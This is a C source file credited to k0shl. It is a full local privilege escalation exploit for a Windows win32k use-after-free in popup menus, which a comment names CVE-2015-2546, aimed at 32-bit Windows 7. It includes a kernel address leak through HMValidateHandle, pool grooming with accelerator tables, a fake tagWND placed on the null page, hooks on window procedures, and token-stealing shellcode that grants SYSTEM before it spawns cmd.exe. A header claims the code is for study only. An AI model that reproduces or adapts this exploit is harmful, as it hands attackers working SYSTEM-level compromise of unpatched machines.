/*

本代码仅供学习研究，请勿用于非法用途
Author: k0shl

*/


#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "user32.lib")

/////////////////////////////////////////////////////////////

#ifdef _WIN64
typedef void*(NTAPI *lHMValidateHandle)(HWND h, int type);
#else
typedef void*(__fastcall *lHMValidateHandle)(HWND h, int type);
#endif


lHMValidateHandle pHmValidateHandle = NULL;

typedef struct _HEAD
{
	HANDLE h;
	DWORD  cLockObj;
} HEAD, *PHEAD;

typedef struct _THROBJHEAD
{
	HEAD h;
	PVOID pti;
} THROBJHEAD, *PTHROBJHEAD;
//
typedef struct _THRDESKHEAD
{
	THROBJHEAD h;
	PVOID    rpdesk;
	PVOID       pSelf;   // points to the kernel mode address
} THRDESKHEAD, *PTHRDESKHEAD;

/////////////////////////////////////////////////////////////

 
typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
	HANDLE Section;
	PVOID  MappedBase;
	PVOID  Base;
	ULONG  Size;
	ULONG  Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT PathLength;
	CHAR   ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG Count;
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

 
////////////////////////////////////////////////////////////

typedef struct _SERVERINFO {
	DWORD dwSRVIFlags;
	DWORD cHandleEntries;
	WORD wSRVIFlags;
	WORD wRIPPID;
	WORD wRIPError;
} SERVERINFO, *PSERVERINFO;

typedef struct _USER_HANDLE_ENTRY {
	void    *pKernel;
	union
	{
		PVOID pi;
		PVOID pti;
		PVOID ppi;
	};
	BYTE type;
	BYTE flags;
	WORD generation;
} USER_HANDLE_ENTRY, *PUSER_HANDLE_ENTRY;

typedef struct _SHAREDINFO {
	PSERVERINFO psi;
	PUSER_HANDLE_ENTRY aheList;
	ULONG HeEntrySize;
	ULONG_PTR pDispInfo;
	ULONG_PTR ulSharedDelts;
	ULONG_PTR awmControl;
	ULONG_PTR DefWindowMsgs;
	ULONG_PTR DefWindowSpecMsgs;
} SHAREDINFO, *PSHAREDINFO;


/////////////////////////////////////////////////////////////

typedef LPVOID PEPROCESS ;
typedef LONG   (__stdcall *PZWQUERYSYSTENINFORMATION)(DWORD, PVOID, ULONG, PDWORD) ;
typedef LONG   (__stdcall *PZWALLOCATEVIRTUALMEMORY) (HANDLE, PVOID, ULONG, PULONG, 
                                                      ULONG, ULONG) ;
typedef LONG   (__stdcall *PLOOKUPPROCESSBYID)(HANDLE, PEPROCESS *) ;
typedef	LPVOID (__stdcall *PTICURRENT)() ;
  

PZWQUERYSYSTENINFORMATION fpQuerySysInfo       = NULL ;
PZWALLOCATEVIRTUALMEMORY  fpAllocateVirtualMem = NULL ;
PLOOKUPPROCESSBYID		  fpLookupProcessById  = NULL ;

DWORD dwTokenOffset = 0 ;
DWORD gFlag1  = 0 ;
DWORD gFlag2  = 0 ;
DWORD gFlag3  = 0 ;
DWORD gFlag4  = 0 ;
DWORD gFlag5  = 0 ;
HWND hwnd2; 
WNDPROC lpPrevWndFunc   = NULL ;

DWORD dwCurProcessId    = 0  ;
DWORD dwSystemProcessId = 0  ;

//////////////////////////////////////
#define KTHREAD_OFFSET    0x124    // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET   0x050    // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET        0x0B4    // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET      0x0B8    // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET      0x0F8    // nt!_EPROCESS.Token
#define SYSTEM_PID 0x004 // SYSTEM Process PID


int __stdcall TokenStealingShellcodeWin7(int one, int two, int three, int four) {
	__asm {
		; initialize
			pushad; save registers state

			xor eax, eax; Set zero
			mov eax, fs:[eax + KTHREAD_OFFSET]; Get nt!_KPCR.PcrbData.CurrentThread
			mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process

			mov ecx, eax; Copy current _EPROCESS structure

			mov ebx, [eax + TOKEN_OFFSET]; Copy current nt!_EPROCESS.Token
			mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM Process PID = 0x4

		SearchSystemPID:
		mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
			sub eax, FLINK_OFFSET
			cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId
			jne SearchSystemPID

			mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token
			mov[ecx + TOKEN_OFFSET], edx; Copy nt!_EPROCESS.Token of SYSTEM
			; to current process
			popad; restore registers state
	}
	return 0;
}

void PrintMsg(const char *formatString, ...)
{
  va_list  va ; 
  va_start(va, formatString) ;
  vprintf(formatString, va) ;
  ExitProcess(0);
}



HMODULE GetKrnlNtBase(char *szNtName)
{	
	char  Buffer[0xA]  ;
	DWORD dwRetLength ;
	
	DWORD SystemModuleInfo = 0x0B ;
	if(0xC0000004 != fpQuerySysInfo(SystemModuleInfo, Buffer, 0x0A, &dwRetLength))
	{
		printf("FAILED \n") ;
		ExitProcess(0) ;
	}
	
	PSYSTEM_MODULE_INFORMATION pBuf = (PSYSTEM_MODULE_INFORMATION)LocalAlloc(LMEM_ZEROINIT, 
	                                                                         dwRetLength) ;
	
	if(0 != fpQuerySysInfo(SystemModuleInfo, pBuf, dwRetLength, &dwRetLength))
	{
		printf("FAILED \n") ;
		ExitProcess(0) ;
	}	
 
 	PSYSTEM_MODULE_INFORMATION_ENTRY pModEntry = pBuf->Module ;
 	HMODULE hModuleBase = NULL ;
 	
	for(ULONG i = 0 ; i < pBuf->Count ; i++ )
  	{
  		//ASCII "\SystemRoot\system32\ntkrnlpa.exe"
	    if(strstr(pModEntry->ImageName, "nt") && strstr(pModEntry->ImageName, "exe"))
	    {
		    strcpy_s(szNtName, MAX_PATH, (char*)((ULONG_PTR)pModEntry->ImageName + pModEntry->PathLength)) ;
		    ///strncpy(szNtName, (char*)((ULONG_PTR)pModEntry->ImageName + pModEntry->PathLength), MAX_PATH) ;
		    hModuleBase = (HMODULE)(pModEntry->Base) ;
		    break ;
	    }
	    pModEntry++ ;
  	}
 
 	if(hModuleBase == NULL)
 	{
 		printf("FAIL : Get Ntoskrnl Base\n") ;
 		ExitProcess(0) ;
 	}
 	
  	LocalFree(pBuf);
  	return hModuleBase;
}


DWORD InitExpVars()
{
	HMODULE hNtdll ;
  
	hNtdll = LoadLibraryA("ntdll.dll");
 	
 	if(hNtdll == NULL)
 	{
 		printf("FAIL : hNtdll == NULL \n") ;
 		ExitProcess(0) ;
 	}
	
	fpQuerySysInfo = (PZWQUERYSYSTENINFORMATION)GetProcAddress(hNtdll, "ZwQuerySystemInformation");
	fpAllocateVirtualMem = (PZWALLOCATEVIRTUALMEMORY)GetProcAddress(hNtdll, "ZwAllocateVirtualMemory");
  
  	if(!fpQuerySysInfo || !fpAllocateVirtualMem)
  	{
  		printf("FAIL : GetProcAddress ZwQuerySystemInformation or ZwAllocateVirtualMemory\n") ;
  		ExitProcess(0) ;
  	}
  	
	char NtKernelName[MAX_PATH] ;
  
	HMODULE hKrnlNtBase = GetKrnlNtBase(NtKernelName);
	HMODULE hUserNtBase = LoadLibraryA(NtKernelName);
 
	fpLookupProcessById = (PLOOKUPPROCESSBYID)((ULONG_PTR)GetProcAddress(hUserNtBase, \
  						  "PsLookupProcessByProcessId") - \
						  (ULONG_PTR)hUserNtBase + \
						  (ULONG_PTR)hKrnlNtBase ) ;

	dwCurProcessId      = GetCurrentProcessId() ;
	dwSystemProcessId   = 4 ;
  
	FreeLibrary(hUserNtBase);
  	
	return 1;
}


LPVOID CallPtiCurrent()  
{
	LPVOID  result = NULL ;
  	HMODULE hUser32 = NULL ;
  	PVOID   dstFunc ;
  	
	hUser32 = LoadLibraryA("user32.dll");
 
	if(hUser32)
	{
	    dstFunc = (PVOID)GetProcAddress(hUser32, "AnimateWindow");
	    if(gFlag2) // gFlag2 always zero in win32 exp
	    {
	      dstFunc = (PVOID)GetProcAddress(hUser32, "CreateSystemThreads");
	    }
	    if(dstFunc && *(WORD *)hUser32 == 0x5A4D )
	    {
	      IMAGE_NT_HEADERS *pPEHead = (IMAGE_NT_HEADERS *)((ULONG_PTR)hUser32 + \
		                              *(DWORD*)((ULONG_PTR)hUser32+0x3C)) ;
#ifdef _WIN64
	      ULONG_PTR ImageBase  = pPEHead->OptionalHeader.ImageBase;
	      ULONG_PTR ImageBound = pPEHead->OptionalHeader.SizeOfImage + ImageBase;
#else
	      DWORD ImageBase  = pPEHead->OptionalHeader.ImageBase;
	      DWORD ImageBound = pPEHead->OptionalHeader.SizeOfImage + ImageBase;
#endif
	      PBYTE p = (PBYTE)dstFunc ;
	      
	      // search function 'PtiCurrent' address in code segment
	      for(DWORD i = 0 ; i < 70 ; i++)
	      {
		      	if((*p == 0xE8 && gFlag2 == 0) || (*p == 0xE9 && gFlag2))
		      	{
		      			if(p < (PBYTE)ImageBase || p > (PBYTE)ImageBound) break ;
		      			
		      			PTICURRENT fpPtiCurrent ; 
						// jmp offset is 4 bytes and can be negative 
		      			fpPtiCurrent = (PTICURRENT)(*(INT *)(p+1) + (LONG_PTR)p + 5) ; 
		      			
		      			result = fpPtiCurrent() ; // result -> tagTHREADINFO 
		      			
		      			break ;
		      	}
		      	p++ ;
	      }
	    }
		FreeLibrary(hUser32);
	}
	return result ;
}



DWORD  InitExploitMem(LPVOID *pAllocAddr)  
{
	LPVOID pThreadInfo = CallPtiCurrent() ;

	*(DWORD*)pAllocAddr = 1 ;

	ULONG uRegionSize  = 0x2000 ;
  
	LONG iret = fpAllocateVirtualMem(  GetCurrentProcess(), 
  									   pAllocAddr, 0, &uRegionSize,  
  									   MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, 
						  			   PAGE_EXECUTE_READWRITE ) ;
	if(iret)
	{
		printf("Allocate Mem Failed \n") ;
		ExitProcess(0) ;
	}

	// fill fake tagWND struct

	*(PVOID*)(0xD)  =  pThreadInfo ;              // 7-(0x5)    = 8   
	*(BYTE*) (0x1B) = (BYTE)4;                   // 0x1B-(0x5)   = 0x16, bServerSideWindowProc change!
	*(PVOID*)(0x65) = (PVOID)TokenStealingShellcodeWin7 ;          // 0x65-(0x5) = 0x60, lpfnWndProc


	return 1;
}


LRESULT CALLBACK MyWndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	if(uMsg == WM_ENTERIDLE) // Message 
	{
		if(gFlag1 != 1)
		{
			gFlag1=1;
			PostMessageA(hWnd, WM_KEYDOWN, 0x28, 0) ;  
			PostMessageA(hWnd, WM_KEYDOWN, 0x27, 0) ; 
			PostMessageA(hWnd, 0x200, 0x110011 ,0x110011);

		}
		else
		{
			PostMessageA(hWnd,WM_CLOSE,0,0);
		}
	}

	return DefWindowProcA(hWnd, uMsg, wParam, lParam) ;
}

LRESULT CALLBACK MyMenuProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	return DefWindowProcA(hWnd, uMsg, wParam, lParam);
}

HMENU InitPopupMenu() 
{
	MENUITEMINFO Item1,  Item2 ;
	HMENU        hMenu1, hMenu2 ;
	
	memset(&Item1, 0, sizeof(Item1));
	memset(&Item2, 0, sizeof(Item2));

	hMenu1 = CreatePopupMenu();
	if(hMenu1 == NULL) return 0 ;
	
 	Item1.cbSize = sizeof(Item1) ;
    Item1.fMask  = MIIM_STRING ; // Retrieves or sets the dwTypeData member.
 	if(FALSE == InsertMenuItemA(hMenu1, 0, TRUE, &Item1))
 	{
 		DestroyMenu(hMenu1) ;
	 	return NULL ; 	
 	}
	
	hMenu2 = CreatePopupMenu() ;
	if(hMenu2 == NULL) return NULL ;
  
	static char szMenuText[2] = " " ;

	Item2.fMask      = MIIM_STRING | MIIM_SUBMENU ;
	Item2.dwTypeData = szMenuText ;
	Item2.cch        = 1 ;             // length of szMenuText
	Item2.hSubMenu   = hMenu1 ;
	Item2.cbSize     = sizeof(Item2) ;
	
 	if(FALSE == InsertMenuItemA(hMenu2, 0, TRUE, &Item2))
 	{
 		printf("InsertMenuItem FAIL [%d] !\n", GetLastError()) ;
 		DestroyMenu(hMenu1) ;
 		DestroyMenu(hMenu2) ;
	 	return NULL  ; 	
 	}
 	return hMenu2 ;
}


LRESULT CALLBACK NewWndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)//back default tagWnd will change!!!
{
	LPACCEL	lpAccel;
	if(uMsg == 0x1EB)
	{
		return (LONG)hwnd2;//if success will return 0xfffffffb after xxxFindWindowFromPoint test change to CallWindowProcA(lpPrevWndFunc, hWnd, uMsg, wParam, lParam) ;
	}
	else if(uMsg == 0x1F0)
	{
		if(hwnd2 != NULL)
		{
			DestroyWindow(hwnd2);
			//we need set accelerator here
			lpAccel = (LPACCEL)LocalAlloc(LPTR, sizeof(ACCEL)*0x5);
			for(int i=0;i<50;i++)
			{
				CreateAcceleratorTable(lpAccel,0x5);
			}
		}
		return 0;
	}
	else if(uMsg == 0x1E5)
	{
		return 0x10;
	}
	return CallWindowProcA(lpPrevWndFunc,hWnd,uMsg,wParam,lParam);
}


 
LRESULT CALLBACK WndProcHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	CWPSTRUCT *pWndProcArgs = (CWPSTRUCT*)lParam ;
	
	if(pWndProcArgs->message == 0x1EB || pWndProcArgs->message == 0x1F0 || pWndProcArgs->message == 0x1E5) // MN_FINDMENUWINDOWFROMPODWORD
 	{
		if(gFlag3!= 3)
		{
			    gFlag3++;
#ifdef _WIN64
				lpPrevWndFunc = (WNDPROC)SetWindowLongPtrA( pWndProcArgs->hwnd, 
				                                            GWLP_WNDPROC, 
														    (LONG_PTR)NewWndProc ) ; // LONG_PTR
#else

				lpPrevWndFunc = (WNDPROC)SetWindowLongA( pWndProcArgs->hwnd, 
				                                         GWL_WNDPROC, 
														 (LONG)NewWndProc ) ;        // LONG
#endif
		}
		
	} 
	return CallNextHookEx(NULL, nCode, wParam, lParam);	
}

void PopShell()
{
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcess("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

}

BOOL FindHMValidateHandle() {
	HMODULE hUser32 = LoadLibraryA("user32.dll");
	if (hUser32 == NULL) {
		printf("Failed to load user32");
		return FALSE;
	}

	BYTE* pIsMenu = (BYTE *)GetProcAddress(hUser32, "IsMenu");
	if (pIsMenu == NULL) {
		printf("Failed to find location of exported function 'IsMenu' within user32.dll\n");
		return FALSE;
	}
	unsigned int uiHMValidateHandleOffset = 0;
	for (unsigned int i = 0; i < 0x1000; i++) {
		BYTE* test = pIsMenu + i;
		if (*test == 0xE8) {
			uiHMValidateHandleOffset = i + 1;
			break;
		}
	}
	if (uiHMValidateHandleOffset == 0) {
		printf("Failed to find offset of HMValidateHandle from location of 'IsMenu'\n");
		return FALSE;
	}
	
	unsigned int addr = *(unsigned int *)(pIsMenu + uiHMValidateHandleOffset);
	unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;
	//The +11 is to skip the padding bytes as on Windows 10 these aren't nops
	pHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + 11);
	return TRUE;
}

DWORD WINAPI ThreadProc(LPVOID lParam) 
{
	WNDCLASS    wc ;
	SYSTEM_INFO SystemInfo ;
	HWND        hWnd ;
  	DWORD       result = 0 ;
  	LPVOID 		pAllocAddr ;
  	WNDCLASS    nw;
	HACCEL hAccel[50];	
	PUSER_HANDLE_ENTRY Address;
	DWORD index;
	PUCHAR pAcceleratorTable[50];
	memset(&SystemInfo, 0, sizeof(SystemInfo));
	memset(&wc, 0, sizeof(wc));
    memset(&nw, 0, sizeof(nw));


	wc.lpfnWndProc   = MyWndProc ;  
	wc.lpszClassName = "test" ;
  
	GetNativeSystemInfo(&SystemInfo);


	if(SystemInfo.dwOemId == PROCESSOR_ARCHITECTURE_AMD64) 
	{
		printf("System Is Not Win32\n") ;
		ExitProcess(0) ;
	}

	BOOL bFound = FindHMValidateHandle();
	if (!bFound) {
		PrintMsg("Failed to locate HmValidateHandle, exiting\n");
	}
	RegisterClassA(&nw) ;
	RegisterClassA(&wc) ;
	hWnd = CreateWindowExA(0, wc.lpszClassName, 0, 0, -1, -1, 0, 0, 0, 0, 0, 0) ;//Create wINDdow named test
	PTHRDESKHEAD tagWND = (PTHRDESKHEAD)pHmValidateHandle(hWnd, 1);
	printf("tagWnd at :0x%.08x\n",tagWND);

	PSHAREDINFO pSharedInfo = (PSHAREDINFO)GetProcAddress(GetModuleHandle("user32.dll"), "gSharedInfo");
	printf("gSharedInfo at:0x%.08x\n",pSharedInfo);
	PUSER_HANDLE_ENTRY gHandleTable = pSharedInfo->aheList;
	LPACCEL	lpAccel = (LPACCEL)LocalAlloc(LPTR, sizeof(ACCEL)*0x5);//create tagPopupmenu hole
	for(int i=0;i<50;i++)
	{
		hAccel[i] = CreateAcceleratorTable(lpAccel,0x5);
		index = LOWORD(hAccel[i]);
		Address = &gHandleTable[index];
		pAcceleratorTable[i]=(PUCHAR)Address->pKernel;
		printf("Create Accelerator Table,Check pKernelAddress at: 0x%.08x\n",pAcceleratorTable[i]);
	}
	for(int i=2;i<50;i=i+5)//Make Pool Hole
	{
		DestroyAcceleratorTable(hAccel[i]);
		printf("Destroy [%d] Accelerator Table,Check pKernelAddress at: 0x%.08x\n",i,pAcceleratorTable[i]);
	}
	hwnd2 = CreateWindowExA(0, "#32768",0,0,-1,-1,0,0,0,0,0,0);
	if(!SetWindowLongA(hwnd2,GWL_WNDPROC,(LONG)&MyMenuProc))
	{
		return 0;
	}

	PTHRDESKHEAD tagWND2 = (PTHRDESKHEAD)pHmValidateHandle(hwnd2, 1);
	PVOID tagPopupmenu = tagWND2->pSelf;
	printf("tagWnd2 at pKernel Address: 0x%.08x\n",tagWND2->pSelf);

	if(hwnd2 == NULL) return 0;
	if(hWnd == NULL) return 0 ;
 
	InitExploitMem(&pAllocAddr) ;//Create 0 page exploit set shellcode

	HMENU hMenu2 = InitPopupMenu();//Create pop up menu
	
	if(hMenu2)
	{
		DWORD dwThreadId = GetCurrentThreadId();
		if(SetWindowsHookExA(WH_CALLWNDPROC,  WndProcHook, 0, dwThreadId))
		{
			// trigger

			if(TrackPopupMenu(hMenu2, 0, -10000, -10000, 0, hWnd, 0))//Create Popup Menu in hWnd
			{
				PostMessageA(hWnd, 0, 0, 0);//if CrEate Success send Button Click Message
				result = 1;
			}
		} 	
	}
	DestroyWindow(hWnd) ;
	if(hwnd2!=NULL)
	{
		DestroyWindow(hwnd2);
	}
	if (hMenu2)
	{
		DestroyMenu(hMenu2);
	}
	UnhookWindowsHook(WH_CALLWNDPROC, WndProcHook);
	VirtualFree(pAllocAddr, 0, MEM_RELEASE);
	return result;
}


DWORD main(DWORD argc, char *argv[])
{

	InitExpVars() ;
	
  	HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ThreadProc, 0, 0, 0);//EoP by vul CVE-2015-2546 in tHRread
 
	if(WaitForSingleObject(hThread, 300000))
	{
    	TerminateThread(hThread, 0);
    	PrintMsg("FAIL [%d]\n", GetLastError()) ; 
  	}	
  	
	PopShell();
	return 0 ;
}

